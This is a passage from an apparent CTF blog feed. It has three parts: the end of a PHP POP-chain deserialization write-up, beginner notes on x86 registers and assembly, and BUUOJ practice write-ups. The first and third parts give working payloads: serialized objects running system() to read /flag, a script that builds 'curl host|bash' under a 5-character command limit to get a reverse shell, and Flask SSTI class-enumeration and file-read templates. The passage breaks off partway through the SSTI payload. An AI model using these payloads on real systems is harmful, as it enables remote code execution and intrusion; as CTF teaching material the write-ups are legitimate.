class="language-none">http:&#x2F;&#x2F;eci-2ze6b0758ddkfbdqshq6.cloudeci1.ichunqiu.com&#x2F;?pop&#x3D;O:6:&quot;oc3cR2&quot;:1:&#123;s:7:&quot;eoGmbyU&quot;;O:6:&quot;P68f9C&quot;:1:&#123;s:7:&quot;FGDnExd&quot;;O:6:&quot;xzpdu7&quot;:1:&#123;s:7:&quot;tMrEI65&quot;;O:6:&quot;NeGUzW&quot;:1:&#123;s:7:&quot;IxYA4YN&quot;;O:6:&quot;ccTQVZ&quot;:1:&#123;s:7:&quot;zlM26BV&quot;;O:6:&quot;w4a1lw&quot;:1:&#123;s:7:&quot;mtUBllc&quot;;O:6:&quot;onRaRG&quot;:1:&#123;s:7:&quot;rvA7BSB&quot;;O:6:&quot;CGpT4s&quot;:1:&#123;s:7:&quot;po41qfC&quot;;O:6:&quot;d4gWv9&quot;:1:&#123;s:7:&quot;UiSXANy&quot;;O:6:&quot;gXUOZX&quot;:1:&#123;s:7:&quot;XdwQRTq&quot;;O:6:&quot;iEfQRF&quot;:1:&#123;s:7:&quot;KRA3QWS&quot;;O:6:&quot;fCnqo4&quot;:1:&#123;s:7:&quot;qSvLUy5&quot;;O:6:&quot;Sg86BZ&quot;:1:&#123;s:7:&quot;LNsywtO&quot;;O:6:&quot;Kyclto&quot;:1:&#123;s:7:&quot;yP0sQDv&quot;;O:6:&quot;HvOSO4&quot;:1:&#123;s:7:&quot;IEXEXgC&quot;;O:6:&quot;nw8rU4&quot;:1:&#123;s:7:&quot;l3RdfVY&quot;;O:6:&quot;S4x3Gm&quot;:1:&#123;s:7:&quot;a7E8Ki4&quot;;O:6:&quot;y709PB&quot;:1:&#123;s:7:&quot;gg7ZGMD&quot;;O:6:&quot;mqeccs&quot;:1:&#123;s:7:&quot;VN0dxHK&quot;;O:6:&quot;wWTYfQ&quot;:1:&#123;s:7:&quot;ERWubTU&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv&#x3D;system(&#39;ls &#x2F;&#39;);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210612125553049.png" alt="image-20210612125553049"></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze6b0758ddkfbdqshq6.cloudeci1.ichunqiu.com&#x2F;?pop&#x3D;O:6:&quot;oc3cR2&quot;:1:&#123;s:7:&quot;eoGmbyU&quot;;O:6:&quot;P68f9C&quot;:1:&#123;s:7:&quot;FGDnExd&quot;;O:6:&quot;xzpdu7&quot;:1:&#123;s:7:&quot;tMrEI65&quot;;O:6:&quot;NeGUzW&quot;:1:&#123;s:7:&quot;IxYA4YN&quot;;O:6:&quot;ccTQVZ&quot;:1:&#123;s:7:&quot;zlM26BV&quot;;O:6:&quot;w4a1lw&quot;:1:&#123;s:7:&quot;mtUBllc&quot;;O:6:&quot;onRaRG&quot;:1:&#123;s:7:&quot;rvA7BSB&quot;;O:6:&quot;CGpT4s&quot;:1:&#123;s:7:&quot;po41qfC&quot;;O:6:&quot;d4gWv9&quot;:1:&#123;s:7:&quot;UiSXANy&quot;;O:6:&quot;gXUOZX&quot;:1:&#123;s:7:&quot;XdwQRTq&quot;;O:6:&quot;iEfQRF&quot;:1:&#123;s:7:&quot;KRA3QWS&quot;;O:6:&quot;fCnqo4&quot;:1:&#123;s:7:&quot;qSvLUy5&quot;;O:6:&quot;Sg86BZ&quot;:1:&#123;s:7:&quot;LNsywtO&quot;;O:6:&quot;Kyclto&quot;:1:&#123;s:7:&quot;yP0sQDv&quot;;O:6:&quot;HvOSO4&quot;:1:&#123;s:7:&quot;IEXEXgC&quot;;O:6:&quot;nw8rU4&quot;:1:&#123;s:7:&quot;l3RdfVY&quot;;O:6:&quot;S4x3Gm&quot;:1:&#123;s:7:&quot;a7E8Ki4&quot;;O:6:&quot;y709PB&quot;:1:&#123;s:7:&quot;gg7ZGMD&quot;;O:6:&quot;mqeccs&quot;:1:&#123;s:7:&quot;VN0dxHK&quot;;O:6:&quot;wWTYfQ&quot;:1:&#123;s:7:&quot;ERWubTU&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv&#x3D;system(&#39;cat &#x2F;flag&#39;);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210612125625091.png" alt="image-20210612125625091"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;强网杯2021-pop链&quot;&gt;&lt;a href=&quot;#强网杯2021-pop链&quot; class=&quot;headerlink&quot; title=&quot;强网杯2021-pop链&quot;&gt;&lt;/a&gt;强网杯2021-pop链&lt;/h1&gt;&lt;p&gt;起初以为pop链是固定的，没有想到还是随机生成的，而且为了混</summary>
      
    
    
    
    <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>RE启动笔记</title>
    <link href="http://yoursite.com/post/RE%E5%90%AF%E5%8A%A8%E7%AC%94%E8%AE%B0.html"/>
    <id>http://yoursite.com/post/RE%E5%90%AF%E5%8A%A8%E7%AC%94%E8%AE%B0.html</id>
    <published>2021-05-03T03:24:23.000Z</published>
    <updated>2021-05-07T14:23:37.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h1><h2 id="常见的处理器架构"><a href="#常见的处理器架构" class="headerlink" title="常见的处理器架构"></a>常见的处理器架构</h2><p>常见的CPU架构有X86架构、AMD64架构、ARM架构、MIPS架构、IA64架构、X86-64架构。</p><p>而这些架构又都会对应相应的指令集，指令集又分为**精简指令集(risv)<strong>和相对复杂的</strong>复杂指令集(cisv)**，其中ARM架构多用于手机等移动设备，例如我们手机的CPU基本都是基于ARM cortex内核的。MIPS架构多用于嵌入式路由器。</p><h2 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h2><p>没有总线，cpu，内存、输入输出设备之间就无法进行沟通，总线的主要作用就是用来进行通讯。总线分为<strong>地址总线</strong>、<strong>数据总线</strong>和<strong>控制总线</strong>。</p><p>并行：就是同时传输，串行就是队列排队传输。</p><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>文本文件编译成可执行程序的过程如下：</p><p>预编译-&gt;编译-&gt;汇编-&gt;链接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -E xxx.c -o xxx.i <span class="token comment">#预编译</span>gcc -S xxx.i -o xxx.s <span class="token comment">#编译</span>gcc -C xxx.s -o xxx.o <span class="token comment">#汇编</span>gcc --static xxx.o -o xxx <span class="token comment">#连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>简单的helloword程序进行预编译后，原来的printf()函数被展开了</p><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210503114456091.png" alt="image-20210503114456091"></p><p>接着进行编译，得到了一个汇编的结果。</p><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210503114604155.png" alt="image-20210503114604155"></p><p>然后在汇编为机器码,使用readelf命令来读取符号表</p><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210503115004806.png" alt="image-20210503115004806"></p><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>直接引用nep的图，师傅的总结。</p><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210503120017430.png" alt="image-20210503120017430"></p><p>al：低八位     ah：高八位   ax：高低合起来的16位   eax: 32位    rax：64位</p><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504103444824.png" alt="image-20210504103444824"></p><p>canary保护在栈里面存储一个值，然后再函数返回的时候，取出这个值，然后进行一个比较，来检测时候存在栈溢出。</p><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504103918698.png" alt="image-20210504103918698"></p><p>结合全名辅助记忆</p><h2 id="运算指令"><a href="#运算指令" class="headerlink" title="运算指令"></a>运算指令</h2><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504105202344.png" alt="image-20210504105202344"></p><h2 id="赋值指令"><a href="#赋值指令" class="headerlink" title="赋值指令"></a>赋值指令</h2><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504105542667.png" alt="image-20210504105542667"></p><h2 id="栈相关指令"><a href="#栈相关指令" class="headerlink" title="栈相关指令"></a>栈相关指令</h2><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504105944144.png" alt="image-20210504105944144"></p><p>pusha和popa是逆过程，pushfd和popfd也是相逆的过程。</p><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504110706025.png" alt="image-20210504110706025"></p><p>cmp指令会把目标操作数-源操作数，然后再由又得到值来判断标志寄存器来跳转。</p><p>a是大于，g也是大于，但是前者是无符号比较，后者是有符号比较。具体可以看图中的条件部分。</p><h2 id="指令调用函数"><a href="#指令调用函数" class="headerlink" title="指令调用函数"></a>指令调用函数</h2><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504111527021.png" alt="image-20210504111527021"></p><p>call后跟需要调用的函数。ret返回函数，retf会影响段寄存器，可以让32位程序执行64位代码。</p><h2 id="外部中断"><a href="#外部中断" class="headerlink" title="外部中断"></a>外部中断</h2><p>外部中断是指来自CPU外部的中断，而外部的中断源必须是某个硬件，所以外部中断又称为硬件中断<br>CPU提供统一的接口作为中断信号的公共线路，所有来自外设的中断信号都共享公共线路连接到CPU，外部硬件的中断通过两根信号线通知CPU的<br>两根信号线分别是INTR(INTeRrupt)和NMI(Non Maskable Interrupt)</p><p><img src="C:\Users\A1andNS\AppData\Roaming\Typora\typora-user-images\image-20210504141927250.png" alt="image-20210504141927250"></p><p>从INTR引脚收到的中断都是不影响系统运行的，可以随时处理<br>从NMI引脚收到的中断，那基本上全是硬伤，CPU都没有运行下去的必要了</p><h2 id="内中断"><a href="#内中断" class="headerlink" title="内中断"></a>内中断</h2><p><strong>除0错误</strong><br><strong>单步中断</strong><br>执行一条指令之后就会引起一次中断<br><strong>执行into指令</strong><br>into这是中断溢出指令，它所触发的中断向量号是 4。不过，能否引发 4 号中断是要看 eflags 标志寄存器中的 OF 位是否为 1，如果是 1 才会引发中断，否则该指令悄悄地什么都不做，低调得很<br><strong>执行int指令</strong><br>int 8位立即数 通过它进行系统调用，8 位立即数可表示 256种中断，这与处理器所支持的中断数是相吻合的<br><strong>异常</strong><br>fault：缺页发生</p><p>trap (int3)    </p><p>abort：终止程序运行</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>in指令一般用来从端口读数据，dx存端口号，读的数据存到al或者ax里面，具体是选择al还是ax是根据对应端口指代的寄存器位数来决定的<br>例如：<br>in al, dx<br>in ax, dx</p><p>out指令一般用来往端口写数据，同样dx存端口号，与in指令不同的是out指令也可以使用立即数来指明端口号，然后要写入的数据使用al或者ax来存，同样具体是选择al还是ax是根据对应端口指代的寄存器位数来决定的</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">out dx, alout dx,axout 立即数, alout 立即数, ax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>基本内联汇编的格式如下：<br>asm [volatile] (“assembly code”)</p><p><code>asm</code>和<code>__asm__</code>是一样的，<code>volatile</code>和<code>__volatile__</code>是一样的，volatile的功能是告诉gcc不要修改我写的汇编代码</p><p>assembly code的规则</p><ol><li><p>指令必须用双引号引起来，无论双引号中是一条指令还是多条指令</p></li><li><p>一对双引号不能跨行，如果跨行需要在结尾用反斜杠’\‘转移</p></li><li><p>指令之间用分号”;”、换行符”\n”或换行符加制表符”\n\t”分隔</p></li></ol><p>拓展内联汇编：</p><p>格式如下</p><p>asm [volatile] (“assembly code”:output : iuput : clobber/modify)</p><p>output：用来指定汇编代码的数据如何输出给C代码使用</p><p>input：用来指定C语言中数据如何输入给汇编使用</p><p>clobber/modify：汇编代码执行后会破坏一些内存或寄存器资源，通过此项通知编译器，可能造成寄存器或内存数据的破坏，这样gcc就知道哪些寄存器或内存需要提前保护起来</p><h3 id="寄存器约束"><a href="#寄存器约束" class="headerlink" title="寄存器约束"></a>寄存器约束</h3><p>寄存器约束就是要求 gcc 使用哪个寄存器，将 input 或 output 中变量约束在某个寄存器中。常见的寄存器约束有：</p><ul><li><p>-a：表示寄存器 eax/ax/al </p></li><li><p>-b：表示寄存器 ebx/bx/bl </p></li><li><p>-c：表示寄存器 ecx/cx/cl </p></li><li><p>-d：表示寄存器 edx/dx/dl </p></li><li><p>-D：表示寄存器 edi/di </p></li><li><p>-S：表示寄存器 esi/si</p></li><li><p>-q：表示任意这 4 个通用寄存器之一：eax/ebx/ecx/edx </p></li><li><p>-r：表示任意这 6 个通用寄存器之一：eax/ebx/ecx/edx/esi/edi</p></li><li><p>-g：表示可以存放到任意地点（寄存器和内存）。相当于除了同 q 一样外，还可以让 gcc 安排在内存中</p></li><li><p>-A：把 eax 和 edx 组合成 64 位整数</p></li><li><p>-f：表示浮点寄存器</p></li><li><p>-t：表示第 1 个浮点寄存器</p></li><li><p>-u：表示第 2 个浮点寄存器</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本知识&quot;&gt;&lt;a href=&quot;#基本知识&quot; class=&quot;headerlink&quot; title=&quot;基本知识&quot;&gt;&lt;/a&gt;基本知识&lt;/h1&gt;&lt;h2 id=&quot;常见的处理器架构&quot;&gt;&lt;a href=&quot;#常见的处理器架构&quot; class=&quot;headerlink&quot; title=&quot;常</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="RE" scheme="http://yoursite.com/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ练习记录210418</title>
    <link href="http://yoursite.com/post/BUUOJ%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95210418.html"/>
    <id>http://yoursite.com/post/BUUOJ%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95210418.html</id>
    <published>2021-04-18T09:49:16.000Z</published>
    <updated>2021-09-30T12:43:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HITCON-2017-Babyfirst-Revenge"><a href="#HITCON-2017-Babyfirst-Revenge" class="headerlink" title="[HITCON 2017]Babyfirst-Revenge"></a>[HITCON 2017]Babyfirst-Revenge</h2><p><strong>考点：长度限制的命令执行</strong></p><p>这是一个典型的限制长度为 5的命令执行题目</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>   <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/sandbox/'</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"orange"</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/bin/rm -rf '</span> <span class="token operator">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接给出了源码，基本思路就是反弹shell，对于这种限制长度的题目，基本上会采用创建大量文件，然后使用<code>ls -t&gt;a</code>命令来构造a文件的内容，实际上也就是一条命令，然后<code>sh a</code>去执行a中的命令，从而实现反弹shell。当然手动的效率比较低，可用考虑写一个脚本以便以后使用。</p><p>在vps上写入一个反弹shell命令到根目录文件，以靶机可以获取。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210419132145.png" alt="命令写入"></p><p>直接写入<code>curl 172.16.172.91|bash</code>使由部分字符会重复，导致没法完整拼接，毕竟长度太短了点。所以使用base64编个码，防止出现这种情况。</p><pre class="line-numbers language-none"><code class="language-none">Y3VybCAxNzIuMTYuMTcyLjkxfGJhc2g&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://26cae3c2-a183-4c3f-b824-c5808df0dce5.node3.buuoj.cn/?cmd="</span>    payload1 <span class="token operator">=</span> <span class="token triple-quoted-string string">r'''>a>\>\\>-d\\>\ \\>64\\>se\\>ba\\>\|\\>=\\>2g\\>hc\\>GJ\\>xf\\>jk\\>yL\\>Tc\\>M\\>Yu\\>MT\\>Iu\\>Nz\\>Ax\\>bC\\>Vy\\>Y3\\>S&#125;\\>IF\\>&#123;\\>\$\\>ho\\>ec\\'''</span>    payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">r'''>ls\\ls>_>\ \\>-t\\>\>yls>>_'''</span>    payload2 <span class="token operator">=</span> payload2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload2<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> i<span class="token punctuation">)</span>        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> i<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> payload1<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> j<span class="token punctuation">)</span>        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> j<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"sh _"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"sh y"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">"sh a"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到我们已经写入了文件_</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210419131446.png" alt="_文件"></p><p>再看一下文件a，可以看到我们已经写入了一个命令在里面，这个时候传入参数到cmd=sh a就可以去执行这个命令，从vps上获取命令并且bash执行，但是buuoj提供的linux内网靶机，不知道为什么反弹shell一直没有成功。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210419131818.png" alt="a文件"></p><p>但是大概的解题思路就是如此了。</p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p><strong>考点：SSTI</strong></p><p>如题一样，这是一个flask框架。这是一个实现base64加解密的小app，而且编码结果和解码结果都存在输出到页面上，考虑测试时候存在ssti问题。14可以但是49不可行，应当是被过滤，<code>*</code>被过滤,先尝试ssti看看，发现到了subclasses查询时就不会有显示了，感觉不太行的样子。先不急，可以稍微看看提示，提示的源码中似乎在提示与PIN码有关。</p><p>所以就在解码处，随便输一个非base64字符来看看有没有开debug mode（前提是没有做异常处理），如果开了我们就可用看看能不能读到一些代码了。事实证明它开启了debug mode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>        text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> <span class="token string">"结果 ： &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span>  render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用debug mode的报错我们get到了上面的这些代码，以及源文件的存储位置为<code>/app/app.py</code>,PING码问题条件不足，从代码来看是要绕过waf函数的限制来进行ssti，但是waf的内容我们这里无法知晓。</p><p>用脚本来找一下可用的类：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">search <span class="token operator">=</span> <span class="token string">'__builtins__'</span>num <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> search <span class="token keyword">in</span> i<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> num<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token triple-quoted-string string">'''运行结果'''</span>_ModuleLock <span class="token number">80</span>_DummyModuleLock <span class="token number">81</span>_ModuleLockManager <span class="token number">82</span>ModuleSpec <span class="token number">83</span>FileLoader <span class="token number">94</span>_NamespacePath <span class="token number">95</span>_NamespaceLoader <span class="token number">96</span>FileFinder <span class="token number">98</span>zipimporter <span class="token number">104</span>_ZipImportResourceReader <span class="token number">105</span>IncrementalEncoder <span class="token number">107</span>IncrementalDecoder <span class="token number">108</span>StreamReaderWriter <span class="token number">109</span>StreamRecoder <span class="token number">110</span>_wrap_close <span class="token number">132</span>Quitter <span class="token number">133</span>_Printer <span class="token number">134</span>DynamicClassAttribute <span class="token number">136</span>_GeneratorWrapper <span class="token number">137</span>WarningMessage <span class="token number">138</span>catch_warnings <span class="token number">139</span>Repr <span class="token number">166</span>partialmethod <span class="token number">174</span>singledispatchmethod <span class="token number">175</span>cached_property <span class="token number">176</span>_GeneratorContextManagerBase <span class="token number">178</span>_BaseExitStack <span class="token number">179</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可用尝试去构造一个payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> i<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> i<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span 